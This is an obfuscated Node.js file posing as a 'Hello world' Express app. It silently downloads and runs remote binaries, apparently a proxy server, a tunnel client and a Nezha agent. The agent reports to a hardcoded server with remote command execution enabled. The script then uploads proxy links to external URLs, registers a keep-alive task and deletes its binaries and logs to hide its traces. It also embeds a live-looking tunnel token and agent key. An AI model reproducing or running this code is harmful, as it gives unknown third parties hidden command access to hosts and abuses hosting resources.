const _0x47c707=_0x2abc;(function(_0x50c1e1,_0x5a99e6){const _0x13471a=_0x2abc,_0x58fc6d=_0x50c1e1();while(!![]){try{const _0x2052a1=-parseInt(_0x13471a(0x23b))/0x1*(parseInt(_0x13471a(0x1dc))/0x2)+-parseInt(_0x13471a(0x18b))/0x3+-parseInt(_0x13471a(0x203))/0x4+parseInt(_0x13471a(0x1e3))/0x5*(-parseInt(_0x13471a(0x215))/0x6)+parseInt(_0x13471a(0x205))/0x7+-parseInt(_0x13471a(0x186))/0x8+parseInt(_0x13471a(0x20c))/0x9;if(_0x2052a1===_0x5a99e6)break;else _0x58fc6d['push'](_0x58fc6d['shift']());}catch(_0x2d905e){_0x58fc6d['push'](_0x58fc6d['shift']());}}}(_0x5036,0x29867));const express=require('express'),app=express(),axios=require(_0x47c707(0x1f4)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x47c707(0x1f3))['exec']),{execSync}=require(_0x47c707(0x1f3)),UPLOAD_URL=process['env'][_0x47c707(0x19d)]||'',PROJECT_URL=process[_0x47c707(0x1e9)][_0x47c707(0x217)]||'',AUTO_ACCESS=process['env'][_0x47c707(0x212)]||![],FILE_PATH=process[_0x47c707(0x1e9)]['FILE_PATH']||_0x47c707(0x201),SUB_PATH=process[_0x47c707(0x1e9)][_0x47c707(0x1b7)]||_0x47c707(0x1fa),PORT=process[_0x47c707(0x1e9)][_0x47c707(0x1a4)]||process['env'][_0x47c707(0x219)]||0xbb8,UUID=process[_0x47c707(0x1e9)][_0x47c707(0x233)]||_0x47c707(0x21b),NEZHA_SERVER=process['env'][_0x47c707(0x1ec)]||'crbvinmnqpyv.us-west-1.clawcloudrun.com:80',NEZHA_PORT=process[_0x47c707(0x1e9)][_0x47c707(0x216)]||'',NEZHA_KEY=process['env'][_0x47c707(0x1b5)]||_0x47c707(0x1aa),ARGO_DOMAIN=process[_0x47c707(0x1e9)][_0x47c707(0x1a0)]||_0x47c707(0x1d7),ARGO_AUTH=process['env'][_0x47c707(0x20b)]||_0x47c707(0x180),ARGO_PORT=process[_0x47c707(0x1e9)]['ARGO_PORT']||0x1405,CFIP=process['env']['CFIP']||_0x47c707(0x1df),CFPORT=process[_0x47c707(0x1e9)][_0x47c707(0x188)]||0x1bb,NAME=process[_0x47c707(0x1e9)][_0x47c707(0x218)]||_0x47c707(0x18c);!fs[_0x47c707(0x22e)](FILE_PATH)?(fs[_0x47c707(0x21f)](FILE_PATH),console['log'](FILE_PATH+_0x47c707(0x1f5))):console[_0x47c707(0x1db)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x23bd88=_0x47c707,_0x2cd706=_0x23bd88(0x182);let _0x2bce54='';for(let _0x27e6ee=0x0;_0x27e6ee<0x6;_0x27e6ee++){_0x2bce54+=_0x2cd706[_0x23bd88(0x1cb)](Math[_0x23bd88(0x1cd)](Math[_0x23bd88(0x1ae)]()*_0x2cd706[_0x23bd88(0x1d6)]));}return _0x2bce54;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x47c707(0x234)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x47c707(0x23a)),listPath=path[_0x47c707(0x234)](FILE_PATH,_0x47c707(0x211)),bootLogPath=path['join'](FILE_PATH,_0x47c707(0x1cf)),configPath=path[_0x47c707(0x234)](FILE_PATH,'config.json');function _0x5036(){const _0x365cfe=['2786IKcguz','has','set','cdns.doon.eu.org','2096','isFile','App\x20is\x20running','1121195crvllm','php\x20running\x20error:\x20','/api/add-nodes','arm64','tunnel.json','Error\x20in\x20startserver:','env','vmess','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','NEZHA_SERVER','&fp=firefox&type=ws&host=','response','close','Download\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-p\x20','child_process','axios','\x20is\x20created','\x20-s\x20','\x20-c\x20\x22','trojan','tls','fu258369','post','substring','/api/add-subscriptions','nohup\x20','status','readdirSync','./tmp','http','1118224JFsrHa','arm','2357271PBMiPk','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','test','/api/delete-nodes','split','2053','ARGO_AUTH','9609768rheSiF','\x0a\x20\x20tunnel:\x20','TunnelSecret','win32','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','list.txt','AUTO_ACCESS','https://amd64.ssss.nyc.mn/agent','map','6BoJCEC','NEZHA_PORT','PROJECT_URL','NAME','PORT','ArgoDomain:','8c6243d2-9af1-44a0-8ba7-b8ffc03bf56c','/config.json\x20>/dev/null\x202>&1\x20&','send','blackhole','mkdirSync','\x20is\x20running','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','none','\x20>/dev/null\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0a\x20\x20\x0avmess://','\x0a\x20\x20\x0atrojan://','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Add\x20automatic\x20access\x20task\x20faild:\x20','.exe\x20>\x20nul\x202>&1','quic','from','tcp','freedom','existsSync','?encryption=none&security=tls&sni=','automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/bot','npm\x20running\x20error:\x20','UUID','join','config.yaml','chmod','/sub.txt\x20saved\x20successfully','\x0aclient_secret:\x20','block','sub.txt','146OUXMyf','https://amd64.ssss.nyc.mn/web','stringify','eyJhIjoiYzZjYjc4NDJiZjM0NDQ3ZGRmZjUyNjAyYTE2ZDVlMWEiLCJ0IjoiZDlhMWFlMmMtMjI3Zi00MGU5LTkxNTUtMzJiN2VhZmIwOWE1IiwicyI6IlpqY3dORGhpWkRJdE56RTFNQzAwTW1ZeExXSmlZak10WW1VMk5EVXdNbU14T1dNdyJ9','push','abcdefghijklmnopqrstuvwxyz','basename','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','--tls','2500176yssFRj','\x0a\x20\x20\x20\x20','CFPORT','clear','pop','644169XvCaYy','xiao','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','readFileSync','text/plain;\x20charset=utf-8','get','message','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20>/dev/null\x202>&1\x20&','forEach','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20credentials-file:\x20','utf-8','Content-Type','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','then','unshift','UPLOAD_URL','\x20-c\x20','Error\x20reading\x20boot.log:','ARGO_DOMAIN','Empowerment\x20success\x20for\x20','includes','base64','SERVER_PORT','2087','unlinkSync','/vmess-argo','writeFileSync','Error\x20downloading\x20files:','g2GOIZ6Ran1hPhztbaZL9EaejJIoCCnG','direct','&path=%2Fvless-argo%3Fed%3D2560#','error','random','application/json','fileName','taskkill\x20/f\x20/im\x20','/dev/null','vless','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','NEZHA_KEY','?security=tls&sni=','SUB_PATH','Subscription\x20uploaded\x20successfully','stream','2083','match','createWriteStream','false','https+local://8.8.8.8/dns-query','Error\x20executing\x20command:\x20','\x20successfully','unlink','8443','toString','/vless-argo','/vmess-argo?ed=2560','listen','Empowerment\x20failed\x20for\x20','trim','amd','https://amd64.ssss.nyc.mn/bot','charAt','\x20failed:\x20','floor','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','boot.log','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','127.0.0.1','true','443','catch','\x22\x20>\x20/dev/null\x202>&1','length','huw.hun94.cloudns.org','platform','\x0avless://','fileUrl','log'];_0x5036=function(){return _0x365cfe;};return _0x5036();}function deleteNodes(){const _0xb36995=_0x47c707;try{if(!UPLOAD_URL)return;if(!fs[_0xb36995(0x22e)](subPath))return;let _0x3ef9d0;try{_0x3ef9d0=fs[_0xb36995(0x18e)](subPath,'utf-8');}catch{return null;}const _0x55fd95=Buffer[_0xb36995(0x22b)](_0x3ef9d0,_0xb36995(0x1a3))[_0xb36995(0x1c3)](_0xb36995(0x197)),_0x31daab=_0x55fd95[_0xb36995(0x209)]('\x0a')['filter'](_0x47f650=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xb36995(0x207)](_0x47f650));if(_0x31daab[_0xb36995(0x1d6)]===0x0)return;return axios['post'](UPLOAD_URL+_0xb36995(0x208),JSON['stringify']({'nodes':_0x31daab}),{'headers':{'Content-Type':_0xb36995(0x1af)}})[_0xb36995(0x1d4)](_0x18c405=>{return null;}),null;}catch(_0x2cafce){return null;}}function _0x2abc(_0x3d235f,_0x5a0d1c){const _0x5036b1=_0x5036();return _0x2abc=function(_0x2abcd2,_0x57c0c1){_0x2abcd2=_0x2abcd2-0x17f;let _0x2fec7c=_0x5036b1[_0x2abcd2];return _0x2fec7c;},_0x2abc(_0x3d235f,_0x5a0d1c);}function cleanupOldFiles(){const _0x5b58f7=_0x47c707;try{const _0x1f832a=fs[_0x5b58f7(0x200)](FILE_PATH);_0x1f832a['forEach'](_0x40b928=>{const _0x560faf=_0x5b58f7,_0x106bf6=path[_0x560faf(0x234)](FILE_PATH,_0x40b928);try{const _0x264b22=fs['statSync'](_0x106bf6);_0x264b22[_0x560faf(0x1e1)]()&&fs[_0x560faf(0x1a6)](_0x106bf6);}catch(_0x4b1929){}});}catch(_0x1f4328){}}app[_0x47c707(0x190)]('/',function(_0x42b49e,_0x15f05b){_0x15f05b['send']('Hello\x20world!');});async function generateConfig(){const _0xb74cd4=_0x47c707,_0x17c885={'log':{'access':_0xb74cd4(0x1b2),'error':'/dev/null','loglevel':_0xb74cd4(0x222)},'inbounds':[{'port':ARGO_PORT,'protocol':_0xb74cd4(0x1b3),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0xb74cd4(0x222),'fallbacks':[{'dest':0xbb9},{'path':_0xb74cd4(0x1c4),'dest':0xbba},{'path':_0xb74cd4(0x1a7),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0xb74cd4(0x22c)}},{'port':0xbb9,'listen':_0xb74cd4(0x1d1),'protocol':_0xb74cd4(0x1b3),'settings':{'clients':[{'id':UUID}],'decryption':_0xb74cd4(0x222)},'streamSettings':{'network':_0xb74cd4(0x22c),'security':_0xb74cd4(0x222)}},{'port':0xbba,'listen':_0xb74cd4(0x1d1),'protocol':_0xb74cd4(0x1b3),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0xb74cd4(0x222),'wsSettings':{'path':_0xb74cd4(0x1c4)}},'sniffing':{'enabled':!![],'destOverride':[_0xb74cd4(0x202),_0xb74cd4(0x1f9),_0xb74cd4(0x22a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xb74cd4(0x1d1),'protocol':_0xb74cd4(0x1ea),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xb74cd4(0x202),_0xb74cd4(0x1f9),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xb74cd4(0x1d1),'protocol':_0xb74cd4(0x1f8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xb74cd4(0x222),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xb74cd4(0x202),_0xb74cd4(0x1f9),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0xb74cd4(0x1be)]},'outbounds':[{'protocol':_0xb74cd4(0x22d),'tag':_0xb74cd4(0x1ab)},{'protocol':_0xb74cd4(0x21e),'tag':_0xb74cd4(0x239)}]};fs[_0xb74cd4(0x1a8)](path['join'](FILE_PATH,'config.json'),JSON[_0xb74cd4(0x17f)](_0x17c885,null,0x2));}function getSystemArchitecture(){const _0x35fad0=_0x47c707,_0x2973fb=os['arch']();return _0x2973fb==='arm'||_0x2973fb===_0x35fad0(0x1e6)||_0x2973fb==='aarch64'?_0x35fad0(0x204):_0x35fad0(0x1c9);}function downloadFile(_0x5b512c,_0x78fb62,_0x1708cb){const _0x361ce3=_0x47c707,_0x205dd7=_0x5b512c;!fs[_0x361ce3(0x22e)](FILE_PATH)&&fs[_0x361ce3(0x21f)](FILE_PATH,{'recursive':!![]});const _0x5b03bd=fs[_0x361ce3(0x1bc)](_0x205dd7);axios({'method':_0x361ce3(0x190),'url':_0x78fb62,'responseType':_0x361ce3(0x1b9)})[_0x361ce3(0x19b)](_0x2017a5=>{_0x2017a5['data']['pipe'](_0x5b03bd),_0x5b03bd['on']('finish',()=>{const _0x251543=_0x2abc;_0x5b03bd[_0x251543(0x1ef)](),console[_0x251543(0x1db)]('Download\x20'+path[_0x251543(0x183)](_0x205dd7)+_0x251543(0x1c0)),_0x1708cb(null,_0x205dd7);}),_0x5b03bd['on']('error',_0x7185c2=>{const _0x973d2a=_0x2abc;fs[_0x973d2a(0x1c1)](_0x205dd7,()=>{});const _0x5874b7=_0x973d2a(0x1f0)+path['basename'](_0x205dd7)+_0x973d2a(0x1cc)+_0x7185c2[_0x973d2a(0x191)];console[_0x973d2a(0x1ad)](_0x5874b7),_0x1708cb(_0x5874b7);});})[_0x361ce3(0x1d4)](_0x13221d=>{const _0x3065cb=_0x361ce3,_0x3da483=_0x3065cb(0x1f0)+path['basename'](_0x205dd7)+_0x3065cb(0x1cc)+_0x13221d[_0x3065cb(0x191)];console[_0x3065cb(0x1ad)](_0x3da483),_0x1708cb(_0x3da483);});}async function downloadFilesAndRun(){const _0x575a55=_0x47c707,_0x1813d6=getSystemArchitecture(),_0x1fc908=getFilesForArchitecture(_0x1813d6);if(_0x1fc908[_0x575a55(0x1d6)]===0x0){console[_0x575a55(0x1db)](_0x575a55(0x227));return;}const _0x40bffe=_0x1fc908[_0x575a55(0x214)](_0x3971a9=>{return new Promise((_0x5b7cee,_0x413efd)=>{const _0x20fcc1=_0x2abc;downloadFile(_0x3971a9[_0x20fcc1(0x1b0)],_0x3971a9[_0x20fcc1(0x1da)],(_0x559c1d,_0x1c1ac6)=>{_0x559c1d?_0x413efd(_0x559c1d):_0x5b7cee(_0x1c1ac6);});});});try{await Promise['all'](_0x40bffe);}catch(_0x1ee472){console[_0x575a55(0x1ad)](_0x575a55(0x1a9),_0x1ee472);return;}function _0x39aac6(_0x52ea19){const _0x14c434=_0x575a55,_0x5eaf7b=0x1fd;_0x52ea19[_0x14c434(0x194)](_0x4b925c=>{const _0x2589ef=_0x14c434;fs['existsSync'](_0x4b925c)&&fs[_0x2589ef(0x236)](_0x4b925c,_0x5eaf7b,_0x3be34f=>{const _0x47dd71=_0x2589ef;_0x3be34f?console[_0x47dd71(0x1ad)](_0x47dd71(0x1c7)+_0x4b925c+':\x20'+_0x3be34f):console[_0x47dd71(0x1db)](_0x47dd71(0x1a1)+_0x4b925c+':\x20'+_0x5eaf7b[_0x47dd71(0x1c3)](0x8));});});}const _0x516f61=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x39aac6(_0x516f61);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40182a=NEZHA_SERVER[_0x575a55(0x1a2)](':')?NEZHA_SERVER['split'](':')[_0x575a55(0x18a)]():'',_0x2c40ac=new Set([_0x575a55(0x1d3),'8443',_0x575a55(0x1e0),_0x575a55(0x1a5),_0x575a55(0x1ba),_0x575a55(0x20a)]),_0x589489=_0x2c40ac[_0x575a55(0x1dd)](_0x40182a)?_0x575a55(0x1d2):_0x575a55(0x1bd),_0x50cfe5=_0x575a55(0x238)+NEZHA_KEY+_0x575a55(0x18d)+NEZHA_SERVER+_0x575a55(0x184)+_0x589489+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x575a55(0x1a8)](path[_0x575a55(0x234)](FILE_PATH,_0x575a55(0x235)),_0x50cfe5);const _0x22d6c3=_0x575a55(0x1fe)+phpPath+_0x575a55(0x1f7)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x22d6c3),console[_0x575a55(0x1db)](phpName+'\x20is\x20running'),await new Promise(_0x5679fc=>setTimeout(_0x5679fc,0x3e8));}catch(_0x369fc4){console['error'](_0x575a55(0x1e4)+_0x369fc4);}}else{let _0x24d061='';const _0x3477a3=[_0x575a55(0x1d3),_0x575a55(0x1c2),'2096',_0x575a55(0x1a5),_0x575a55(0x1ba),'2053'];_0x3477a3[_0x575a55(0x1a2)](NEZHA_PORT)&&(_0x24d061=_0x575a55(0x185));const _0x1bed66='nohup\x20'+npmPath+_0x575a55(0x1f6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x575a55(0x1f2)+NEZHA_KEY+'\x20'+_0x24d061+_0x575a55(0x1ce);try{await exec(_0x1bed66),console[_0x575a55(0x1db)](npmName+_0x575a55(0x220)),await new Promise(_0x5b2111=>setTimeout(_0x5b2111,0x3e8));}catch(_0x993e93){console['error'](_0x575a55(0x232)+_0x993e93);}}}else console['log'](_0x575a55(0x1f1));const _0xe47d8e='nohup\x20'+webPath+_0x575a55(0x19e)+FILE_PATH+_0x575a55(0x21c);try{await exec(_0xe47d8e),console[_0x575a55(0x1db)](webName+_0x575a55(0x220)),await new Promise(_0x514ff2=>setTimeout(_0x514ff2,0x3e8));}catch(_0x1e52a8){console[_0x575a55(0x1ad)]('web\x20running\x20error:\x20'+_0x1e52a8);}if(fs[_0x575a55(0x22e)](botPath)){let _0x240c03;if(ARGO_AUTH[_0x575a55(0x1bb)](/^[A-Z0-9a-z=]{120,250}$/))_0x240c03=_0x575a55(0x192)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x240c03=_0x575a55(0x19a)+FILE_PATH+'/tunnel.yml\x20run':_0x240c03='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x575a55(0x206)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x240c03+_0x575a55(0x193)),console[_0x575a55(0x1db)](botName+_0x575a55(0x220)),await new Promise(_0x34e409=>setTimeout(_0x34e409,0x7d0));}catch(_0x598769){console['error'](_0x575a55(0x1bf)+_0x598769);}}await new Promise(_0x589c01=>setTimeout(_0x589c01,0x1388));}function getFilesForArchitecture(_0x5809cb){const _0x38aa5b=_0x47c707;let _0x464fab;_0x5809cb==='arm'?_0x464fab=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x38aa5b(0x231)}]:_0x464fab=[{'fileName':webPath,'fileUrl':_0x38aa5b(0x23c)},{'fileName':botPath,'fileUrl':_0x38aa5b(0x1ca)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5ea714=_0x5809cb==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x38aa5b(0x213);_0x464fab[_0x38aa5b(0x19c)]({'fileName':npmPath,'fileUrl':_0x5ea714});}else{const _0x5e88b0=_0x5809cb===_0x38aa5b(0x204)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x464fab[_0x38aa5b(0x19c)]({'fileName':phpPath,'fileUrl':_0x5e88b0});}}return _0x464fab;}function argoType(){const _0x2f7a7f=_0x47c707;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x2f7a7f(0x1d0));return;}if(ARGO_AUTH[_0x2f7a7f(0x1a2)](_0x2f7a7f(0x20e))){fs[_0x2f7a7f(0x1a8)](path[_0x2f7a7f(0x234)](FILE_PATH,_0x2f7a7f(0x1e7)),ARGO_AUTH);const _0x37f210=_0x2f7a7f(0x20d)+ARGO_AUTH['split']('\x22')[0xb]+_0x2f7a7f(0x196)+path[_0x2f7a7f(0x234)](FILE_PATH,_0x2f7a7f(0x1e7))+_0x2f7a7f(0x221)+ARGO_DOMAIN+_0x2f7a7f(0x195)+ARGO_PORT+_0x2f7a7f(0x1b4);fs[_0x2f7a7f(0x1a8)](path[_0x2f7a7f(0x234)](FILE_PATH,'tunnel.yml'),_0x37f210);}else console[_0x2f7a7f(0x1db)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x52d655=_0x47c707;let _0x379df1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x379df1=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x379df1),await _0xac31e3(_0x379df1);else try{const _0x5b6552=fs[_0x52d655(0x18e)](path[_0x52d655(0x234)](FILE_PATH,_0x52d655(0x1cf)),_0x52d655(0x197)),_0x79a382=_0x5b6552[_0x52d655(0x209)]('\x0a'),_0x287139=[];_0x79a382[_0x52d655(0x194)](_0x324e81=>{const _0x2fea09=_0x52d655,_0x199abc=_0x324e81[_0x2fea09(0x1bb)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x199abc){const _0x15ae3b=_0x199abc[0x1];_0x287139[_0x2fea09(0x181)](_0x15ae3b);}});if(_0x287139[_0x52d655(0x1d6)]>0x0)_0x379df1=_0x287139[0x0],console['log'](_0x52d655(0x21a),_0x379df1),await _0xac31e3(_0x379df1);else{console[_0x52d655(0x1db)](_0x52d655(0x199)),fs[_0x52d655(0x1a6)](path['join'](FILE_PATH,'boot.log'));async function _0x2203cf(){const _0x42ad54=_0x52d655;try{process[_0x42ad54(0x1d8)]==='win32'?await exec(_0x42ad54(0x1b1)+botName+_0x42ad54(0x229)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x42ad54(0x1fc)](0x1)+_0x42ad54(0x1d5));}catch(_0x13623f){}}_0x2203cf(),await new Promise(_0x5b6569=>setTimeout(_0x5b6569,0xbb8));const _0x2e2266=_0x52d655(0x210)+FILE_PATH+_0x52d655(0x206)+ARGO_PORT;try{await exec(_0x52d655(0x1fe)+botPath+'\x20'+_0x2e2266+'\x20>/dev/null\x202>&1\x20&'),console[_0x52d655(0x1db)](botName+_0x52d655(0x220)),await new Promise(_0x3c9385=>setTimeout(_0x3c9385,0xbb8)),await extractDomains();}catch(_0xd9b4e7){console[_0x52d655(0x1ad)]('Error\x20executing\x20command:\x20'+_0xd9b4e7);}}}catch(_0x566e66){console['error'](_0x52d655(0x19f),_0x566e66);}async function _0xac31e3(_0x219a9e){const _0xa7f60b=_0x52d655,_0x27b463=execSync(_0xa7f60b(0x1eb),{'encoding':_0xa7f60b(0x197)}),_0x350e9e=_0x27b463[_0xa7f60b(0x1c8)](),_0x96585d=NAME?NAME+'-'+_0x350e9e:_0x350e9e;return new Promise(_0x1ec7a6=>{setTimeout(()=>{const _0x1255f4=_0x2abc,_0x211415={'v':'2','ps':''+_0x96585d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1255f4(0x222),'net':'ws','type':'none','host':_0x219a9e,'path':_0x1255f4(0x1c5),'tls':_0x1255f4(0x1f9),'sni':_0x219a9e,'alpn':'','fp':'firefox'},_0x5f0a68=_0x1255f4(0x1d9)+UUID+'@'+CFIP+':'+CFPORT+_0x1255f4(0x22f)+_0x219a9e+'&fp=firefox&type=ws&host='+_0x219a9e+_0x1255f4(0x1ac)+_0x96585d+_0x1255f4(0x225)+Buffer[_0x1255f4(0x22b)](JSON[_0x1255f4(0x17f)](_0x211415))['toString'](_0x1255f4(0x1a3))+_0x1255f4(0x226)+UUID+'@'+CFIP+':'+CFPORT+_0x1255f4(0x1b6)+_0x219a9e+_0x1255f4(0x1ed)+_0x219a9e+_0x1255f4(0x224)+_0x96585d+_0x1255f4(0x187);console[_0x1255f4(0x1db)](Buffer[_0x1255f4(0x22b)](_0x5f0a68)['toString'](_0x1255f4(0x1a3))),fs[_0x1255f4(0x1a8)](subPath,Buffer['from'](_0x5f0a68)[_0x1255f4(0x1c3)](_0x1255f4(0x1a3))),console[_0x1255f4(0x1db)](FILE_PATH+_0x1255f4(0x237)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x17c4f1,_0x203b8a)=>{const _0x29e1fe=_0x1255f4,_0x44a672=Buffer['from'](_0x5f0a68)[_0x29e1fe(0x1c3)]('base64');_0x203b8a[_0x29e1fe(0x1de)](_0x29e1fe(0x198),_0x29e1fe(0x18f)),_0x203b8a[_0x29e1fe(0x21d)](_0x44a672);}),_0x1ec7a6(_0x5f0a68);},0x7d0);});}}async function uploadNodes(){const _0x3f1bae=_0x47c707;if(UPLOAD_URL&&PROJECT_URL){const _0x4c2d2f=PROJECT_URL+'/'+SUB_PATH,_0x1f43f0={'subscription':[_0x4c2d2f]};try{const _0x50b783=await axios[_0x3f1bae(0x1fb)](UPLOAD_URL+_0x3f1bae(0x1fd),_0x1f43f0,{'headers':{'Content-Type':_0x3f1bae(0x1af)}});return _0x50b783&&_0x50b783[_0x3f1bae(0x1ff)]===0xc8?(console[_0x3f1bae(0x1db)](_0x3f1bae(0x1b8)),_0x50b783):null;}catch(_0x2afa15){if(_0x2afa15[_0x3f1bae(0x1ee)]){if(_0x2afa15[_0x3f1bae(0x1ee)][_0x3f1bae(0x1ff)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3f1bae(0x22e)](listPath))return;const _0x56b473=fs[_0x3f1bae(0x18e)](listPath,_0x3f1bae(0x197)),_0x35ac12=_0x56b473[_0x3f1bae(0x209)]('\x0a')['filter'](_0xe34891=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3f1bae(0x207)](_0xe34891));if(_0x35ac12[_0x3f1bae(0x1d6)]===0x0)return;const _0x1bd033=JSON['stringify']({'nodes':_0x35ac12});try{const _0x54f9c8=await axios['post'](UPLOAD_URL+_0x3f1bae(0x1e5),_0x1bd033,{'headers':{'Content-Type':'application/json'}});return _0x54f9c8&&_0x54f9c8[_0x3f1bae(0x1ff)]===0xc8?(console[_0x3f1bae(0x1db)]('Nodes\x20uploaded\x20successfully'),_0x54f9c8):null;}catch(_0x2208ac){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x43c259=_0x2abc,_0xef8029=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xef8029['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xef8029[_0x43c259(0x181)](phpPath);process[_0x43c259(0x1d8)]===_0x43c259(0x20f)?exec('del\x20/f\x20/q\x20'+_0xef8029[_0x43c259(0x234)]('\x20')+'\x20>\x20nul\x202>&1',_0x13f6bd=>{const _0x84418=_0x43c259;console['clear'](),console['log'](_0x84418(0x1e2)),console[_0x84418(0x1db)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0xef8029['join']('\x20')+_0x43c259(0x223),_0xcd46d2=>{const _0x20bc7d=_0x43c259;console[_0x20bc7d(0x189)](),console[_0x20bc7d(0x1db)](_0x20bc7d(0x1e2)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x567cac=_0x47c707;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x567cac(0x1db)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3b7785=await axios[_0x567cac(0x1fb)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x567cac(0x1af)}});return console[_0x567cac(0x1db)](_0x567cac(0x230)),_0x3b7785;}catch(_0x44134b){return console[_0x567cac(0x1ad)](_0x567cac(0x228)+_0x44134b[_0x567cac(0x191)]),null;}}async function startserver(){const _0x3dd538=_0x47c707;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x23b84c){console[_0x3dd538(0x1ad)](_0x3dd538(0x1e8),_0x23b84c);}}startserver()['catch'](_0x402e65=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x402e65);}),app[_0x47c707(0x1c6)](PORT,()=>console[_0x47c707(0x1db)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
